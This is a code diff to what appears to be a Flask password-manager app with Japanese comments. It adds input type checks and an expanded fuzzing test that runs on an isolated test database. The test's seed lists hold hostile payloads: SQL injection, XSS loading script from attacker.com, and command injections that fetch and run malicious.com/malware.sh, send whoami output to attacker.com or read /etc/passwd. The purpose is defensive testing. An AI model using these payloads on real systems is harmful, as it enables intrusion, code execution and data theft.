@@ -352,6 +352,11 @@ def add_entry():
     username = data.get('username', '')
     password = data.get('password', '')
     
+    # 攻撃対策: Type Confusion (型偽装) への防御を強化。文字列以外が来たら弾く。
+    if not isinstance(service, str) or not isinstance(username, str) or not isinstance(password, str):
+        if key: del key
+        return jsonify({'error': '無効なデータ形式です'}), 400
+    
     if not all([service, username, password]):
         if key: del key
         return jsonify({'error': '入力項目が不足しています'}), 400
@@ -386,6 +391,11 @@ def update_entry():
     service = data.get('service', '')
     username = data.get('username', '')
     password = data.get('password', '')
+    
+    # 攻撃対策: Type Confusion (型偽装) への防御を強化。
+    if not isinstance(service, str) or not isinstance(username, str) or not isinstance(password, str):
+        if key: del key
+        return jsonify({'error': '無効なデータ形式です'}), 400
     
     if not item_id or not all([service, username, password]):
         if key: del key
@@ -827,127 +837,214 @@ def run_security_tests(num_tests=10000):
     アプリケーションの堅牢性を検証するため、数千〜万件に及ぶ動的攻撃パケットを生成し、
     全てのエンドポイントに対して連続テスト（ファジング）を実施するエンジン。
     """
+    global DB_FILE
+    
     print("\n========================================================")
     print(f"🛡️ セキュリティテストエンジン起動")
     print(f"   動的ファジングテスト {num_tests} 件を実行します。")
-    print("   ※ タイミング攻撃対策の防衛機能（遅延）が作動するため、数十分かかる場合があります。")
+    print("   ※ 完全隔離されたテスト専用データベースを使用し、認証を突破した状態から")
+    print("      システム内部に高度な攻撃ペイロードを直接打ち込みます。")
     print("   ※ 実行状況と防御のステータスを詳細にログ出力します。")
     print("========================================================\n")
     
-    # 既存のDBを一時的にメモリ上でクリーンに保つためテストクライアントを使用
-    client = app.test_client()
-    
-    # テスト用ユーザーの初期化
-    test_pw = "Fuzzing_Master_Password_2026!"
-    client.post('/api/init', json={'password': test_pw})
-    valid_auth_header = base64.b64encode(test_pw.encode()).decode()
-    headers = {'X-Master-Key': valid_auth_header}
-    
-    # 攻撃ベクトルのシード (動的生成の元となる不正パケット群)
-    sql_payloads = [
-        "' OR '1'='1", "'; DROP TABLE passwords; --", 
-        "\" OR \"\"=\"", "admin' --", "1' ORDER BY 1--+"
-    ]
-    xss_payloads = [
-        "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
-        "javascript:alert(1)", "<svg/onload=alert(1)>"
-    ]
-    cmd_payloads = [
-        "; cat /etc/passwd", "| ls -la", "`whoami`", "$(ping -c 1 8.8.8.8)"
-    ]
-    
-    # テスト結果の集計
-    results = {'blocked_or_safe': 0, 'crashed': 0}
-    start_time = time.time()
-    
-    for i in range(1, num_tests + 1):
-        # 毎回のループでランダムな攻撃ベクトルを選択し、パケットを合成
-        attack_type = secrets.choice([
-            'SQL_INJECTION', 'XSS', 'COMMAND_INJECTION', 
-            'AUTH_BYPASS', 'BUFFER_OVERFLOW', 'TAMPERING'
-        ])
+    # 既存のDBと混ざらないよう、テスト専用の完全に隔離された環境を作成する
+    test_db = 'test_fuzzing.db'
+    if os.path.exists(test_db):
+        try: os.remove(test_db)
+        except: pass
         
-        try:
-            res = None
-            payload_info = ""
-            
-            if attack_type == 'SQL_INJECTION':
-                payload = secrets.choice(sql_payloads)
-                payload_info = f"payload='{payload}'"
-                res = client.post('/api/entries', json={'service': payload, 'username': 'test', 'password': 'test'}, headers=headers)
-                
-            elif attack_type == 'XSS':
-                payload = secrets.choice(xss_payloads)
-                payload_info = f"payload='{payload}'"
-                res = client.post('/api/entries', json={'service': 'test', 'username': payload, 'password': 'test'}, headers=headers)
-                
-            elif attack_type == 'COMMAND_INJECTION':
-                payload = secrets.choice(cmd_payloads)
-                payload_info = f"payload='{payload}'"
-                res = client.put('/api/entries', json={'id': '1', 'service': 'test', 'username': 'test', 'password': payload}, headers=headers)
-                
-            elif attack_type == 'AUTH_BYPASS':
-                # 不正なマスターキーによるアクセス試行
-                fake_header = base64.b64encode(secrets.token_bytes(16)).decode()
-                payload_info = "Invalid Header"
-                res = client.get('/api/entries', headers={'X-Master-Key': fake_header})
-                
-            elif attack_type == 'BUFFER_OVERFLOW':
-                # 巨大なペイロードを送りつけ、メモリ破壊を試みる
-                length = secrets.randbelow(15000) + 5000
-                huge_payload = "A" * length
-                payload_info = f"length={length} bytes"
-                res = client.post('/api/entries', json={'service': huge_payload, 'username': '', 'password': ''}, headers=headers)
-                
-            elif attack_type == 'TAMPERING':
-                # クエリパラメータの改ざんや不正なID形式
-                malformed_id = secrets.choice(["1 OR 1=1", "-1", "999999999999", "';--"])
-                payload_info = f"id='{malformed_id}'"
-                res = client.delete(f'/api/entries?id={malformed_id}', headers=headers)
-                
-            # 評価: HTTP 500番台(Internal Server Error)以外であれば、適切に防御・無害化されたと判断する
-            # (400 Bad Request や 401 Unauthorized も正常な防御機能としてカウント)
-            if res is not None and res.status_code < 500:
-                results['blocked_or_safe'] += 1
-                
-                # サンプリングログ出力 (100回に1回、進捗と正常防御の様子を出力)
-                if i % 100 == 0:
-                    print(f" [INFO] {i:>5}/{num_tests} | 攻撃: {attack_type:<18} | 防御成功 (Status: {res.status_code}) | {payload_info}")
-            else:
-                results['crashed'] += 1
-                status_code = res.status_code if res else "Unknown"
-                
-                # エラーハンドラが付与した詳細なエラー情報を取得する
-                try:
-                    err_msg = res.get_json().get("details", "No details provided")
-                except Exception:
-                    err_msg = res.get_data(as_text=True) if res else "No response body"
-                    
-                print(f"\n 🚨 [CRASH DETECTED] {i}件目のテストで異常終了が発生しました！")
-                print(f"    - 攻撃タイプ: {attack_type} ({payload_info})")
-                print(f"    - HTTP Status: {status_code}")
-                print(f"    - エラー詳細: {err_msg}\n")
-                
-        except Exception as e:
-            # サーバー側で例外処理しきれずクラッシュした場合
-            results['crashed'] += 1
-            print(f"\n 🚨 [FATAL EXCEPTION] {i}件目のテストでシステム例外が発生しました！")
-            print(f"    - 攻撃タイプ: {attack_type}")
-            print(f"    - 例外情報: {str(e)}\n")
-            
-    elapsed = time.time() - start_time
+    original_db = DB_FILE
+    DB_FILE = test_db
     
-    print("\n========================================================")
-    print(f"🎯 テスト完了: 計 {num_tests} 件の動的攻撃ペイロードを処理")
-    print(f"⏱️ 実行時間: {elapsed:.2f} 秒")
-    print(f"🛡️ 安全処理・防御成功: {results['blocked_or_safe']} 件")
-    print(f"⚠️ 異常終了(クラッシュ): {results['crashed']} 件")
-    print("========================================================\n")
-    if results['crashed'] == 0:
-        print("✅ 検証合格: すべての攻撃ベクトルに対してシステムは正常に稼働・防御しました。")
-    else:
-        print("❌ 警告: 一部の攻撃によってシステムが異常終了しました。詳細ログを確認してください。")
+    try:
+        # テスト専用DBを初期化
+        with app.app_context():
+            init_db()
+            
+        client = app.test_client()
+        
+        # テスト用ユーザーの作成と認証突破（ここが正しくないと攻撃が入り口で弾かれるだけになる）
+        test_pw = "Fuzzing_Master_Password_2026!"
+        client.post('/api/init', json={'password': test_pw})
+        valid_auth_header = base64.b64encode(test_pw.encode()).decode()
+        headers = {'X-Master-Key': valid_auth_header}
+        
+        # 更新・削除の攻撃が空振りしないよう、事前にダミーデータを1件挿入しておく
+        client.post('/api/entries', json={'service': 'dummy', 'username': 'dummy', 'password': 'dummy'}, headers=headers)
+        
+        # 超高度・巧妙化された攻撃ベクトルのシード (ペネトレーションテストレベル)
+        sql_payloads = [
+            "' OR '1'='1", "'; DROP TABLE passwords; --", 
+            "1' UNION SELECT NULL, NULL, NULL--", "admin' OR SLEEP(5)--",
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", # タイムベースブラインド
+            "admin' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", # WAFバイパス
+            "1' OR 1=1 LIMIT 1,1--", "1' AND ASCII(SUBSTRING(password,1,1))>97--",
+            "'-'", "') OR ('1'='1", "admin'#"
+        ]
+        
+        xss_payloads = [
+            "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
+            "'-prompt(8)-'", "\"><iframe src=javascript:alert(1)>",
+            "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://attacker.com\\';document.body.appendChild(a)')",
+            # ポリグロット (WAF回避の複合ペイロード)
+            "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+            "<svg/onload=eval(atob('YWxlcnQoMSk='))>", # Base64難読化
+            "\"\x3e\x3cimg src=x onerror=prompt(1)\x3e", # Unicodeエスケープ
+            "<a href=\"javas&#99;ript:alert(1)\">click</a>" # HTMLエンティティ
+        ]
+        
+        cmd_payloads = [
+            "; cat /etc/passwd", "| ls -la", "`whoami`", "$(ping -c 1 8.8.8.8)",
+            "& echo test &", ";wget http://malicious.com/malware.sh -O /tmp/mal;sh /tmp/mal",
+            "cat${IFS}/etc/passwd", # スペース回避
+            "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh", # Base64エンコード実行
+            "curl http://attacker.com/$(whoami)", # データ持ち出し
+            "| awk '{print $1}' /etc/passwd"
+        ]
 
+        traversal_payloads = [
+            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "/var/www/html/../../../../../../etc/passwd",
+            "file:///etc/passwd"
+        ]
+        
+        # テスト結果の集計
+        results = {'blocked_or_safe': 0, 'crashed': 0}
+        start_time = time.time()
+        
+        for i in range(1, num_tests + 1):
+            attack_type = secrets.choice([
+                'SQL_INJECTION', 'XSS', 'COMMAND_INJECTION', 
+                'AUTH_BYPASS', 'BUFFER_OVERFLOW', 'TAMPERING', 'TYPE_CONFUSION',
+                'DIRECTORY_TRAVERSAL', 'PROTOTYPE_POLLUTION', 'REDOS'
+            ])
+            
+            try:
+                res = None
+                payload_info = ""
+                
+                if attack_type == 'SQL_INJECTION':
+                    payload = secrets.choice(sql_payloads)
+                    payload_info = f"payload='{payload}'"
+                    res = client.post('/api/entries', json={'service': payload, 'username': 'test', 'password': 'test'}, headers=headers)
+                    
+                elif attack_type == 'XSS':
+                    payload = secrets.choice(xss_payloads)
+                    payload_info = f"payload='{payload}'"
+                    res = client.post('/api/entries', json={'service': 'test', 'username': payload, 'password': 'test'}, headers=headers)
+                    
+                elif attack_type == 'COMMAND_INJECTION':
+                    payload = secrets.choice(cmd_payloads)
+                    payload_info = f"payload='{payload}'"
+                    res = client.put('/api/entries', json={'id': '1', 'service': 'test', 'username': 'test', 'password': payload}, headers=headers)
+                    
+                elif attack_type == 'AUTH_BYPASS':
+                    # 不正なマスターキーによるアクセス試行 (これは弾かれるのが正解)
+                    fake_header = base64.b64encode(secrets.token_bytes(16)).decode()
+                    payload_info = "Invalid Header"
+                    res = client.get('/api/entries', headers={'X-Master-Key': fake_header})
+                    
+                elif attack_type == 'BUFFER_OVERFLOW':
+                    # 巨大なペイロードを送りつけ、メモリ破壊を試みる
+                    length = secrets.randbelow(15000) + 5000
+                    huge_payload = "A" * length
+                    payload_info = f"length={length} bytes"
+                    res = client.post('/api/entries', json={'service': huge_payload, 'username': '', 'password': ''}, headers=headers)
+                    
+                elif attack_type == 'TAMPERING':
+                    # クエリパラメータの改ざんや不正なID形式
+                    malformed_id = secrets.choice(["1 OR 1=1", "-1", "999999999999", "';--"])
+                    payload_info = f"id='{malformed_id}'"
+                    res = client.delete(f'/api/entries?id={malformed_id}', headers=headers)
+                    
+                elif attack_type == 'TYPE_CONFUSION':
+                    # 文字列を期待するAPIに対し、配列や辞書オブジェクトを送信してクラッシュ(500エラー)を狙う
+                    payload_info = "payload: Array/Dict Object"
+                    res = client.post('/api/entries', json={'service': ['admin'], 'username': {'$ne': None}, 'password': 12345}, headers=headers)
+
+                elif attack_type == 'DIRECTORY_TRAVERSAL':
+                    payload = secrets.choice(traversal_payloads)
+                    payload_info = f"payload='{payload}'"
+                    # GETリクエストのパラメータとしてトラバーサルを試みる
+                    res = client.get(f'/api/entries?q={payload}', headers=headers)
+                
+                elif attack_type == 'PROTOTYPE_POLLUTION':
+                    # JavaScript/NoSQLの脆弱性を狙う特殊なキーを含むJSON
+                    malicious_json = {
+                        "__proto__": {"isAdmin": True},
+                        "constructor": {"prototype": {"auth": 1}},
+                        "service": "test",
+                        "username": {"$gt": ""}, # NoSQL Injection
+                        "password": "test"
+                    }
+                    payload_info = "payload: Prototype Pollution / NoSQLi"
+                    res = client.post('/api/entries', json=malicious_json, headers=headers)
+
+                elif attack_type == 'REDOS':
+                    # 正規表現エンジンをフリーズさせるような極端な文字列 (ReDoS)
+                    redos_payload = "a" * 50000 + "!"
+                    payload_info = "payload: ReDoS string (50000 chars)"
+                    res = client.post('/api/entries', json={'service': redos_payload, 'username': 'test', 'password': 'test'}, headers=headers)
+                    
+                # 評価: HTTP 500番台(Internal Server Error)以外であれば、適切に防御・無害化されたと判断する
+                if res is not None and res.status_code < 500:
+                    results['blocked_or_safe'] += 1
+                    
+                    if res.status_code == 200:
+                        status_text = "無害化して保存 (200)"
+                    elif res.status_code == 400:
+                        status_text = "不正入力ブロック (400)"
+                    elif res.status_code == 401:
+                        status_text = "認証拒否 (401)"
+                    elif res.status_code == 404:
+                        status_text = "対象なし (404)"
+                    else:
+                        status_text = f"Status: {res.status_code}"
+                    
+                    # サンプリングログ出力 (100回に1回、進捗と正常防御の様子を出力)
+                    if i % 100 == 0:
+                        print(f" [INFO] {i:>5}/{num_tests} | 攻撃: {attack_type:<20} | 防御成功: {status_text:<15} | {payload_info}")
+                else:
+                    results['crashed'] += 1
+                    status_code = res.status_code if res else "Unknown"
+                    
+                    try:
+                        err_msg = res.get_json().get("details", "No details provided")
+                    except Exception:
+                        err_msg = res.get_data(as_text=True) if res else "No response body"
+                        
+                    print(f"\n 🚨 [CRASH DETECTED] {i}件目のテストで異常終了が発生しました！")
+                    print(f"    - 攻撃タイプ: {attack_type} ({payload_info})")
+                    print(f"    - HTTP Status: {status_code}")
+                    print(f"    - エラー詳細: {err_msg}\n")
+                    
+            except Exception as e:
+                # サーバー側で例外処理しきれずクラッシュした場合
+                results['crashed'] += 1
+                print(f"\n 🚨 [FATAL EXCEPTION] {i}件目のテストでシステム例外が発生しました！")
+                print(f"    - 攻撃タイプ: {attack_type}")
+                print(f"    - 例外情報: {str(e)}\n")
+                
+        elapsed = time.time() - start_time
+        
+        print("\n========================================================")
+        print(f"🎯 テスト完了: 計 {num_tests} 件の動的攻撃ペイロードを処理")
+        print(f"⏱️ 実行時間: {elapsed:.2f} 秒")
+        print(f"🛡️ 安全処理・防御成功: {results['blocked_or_safe']} 件")
+        print(f"⚠️ 異常終了(クラッシュ): {results['crashed']} 件")
+        print("========================================================\n")
+        if results['crashed'] == 0:
+            print("✅ 検証合格: 超高度な攻撃ベクトルに対し、システムは無害化・防御を完全に遂行しました。")
+        else:
+            print("❌ 警告: 一部の攻撃によってシステムが異常終了しました。詳細ログを確認してください。")
+
+    finally:
+        # テスト終了後は必ず元のDBファイル設定に戻し、テスト用DBを破棄する
+        if os.path.exists(test_db):
+            try: os.remove(test_db)
+            except: pass
+        DB_FILE = original_db
 
 # =========================================================
 # 7. プログラム起動エンドポイント
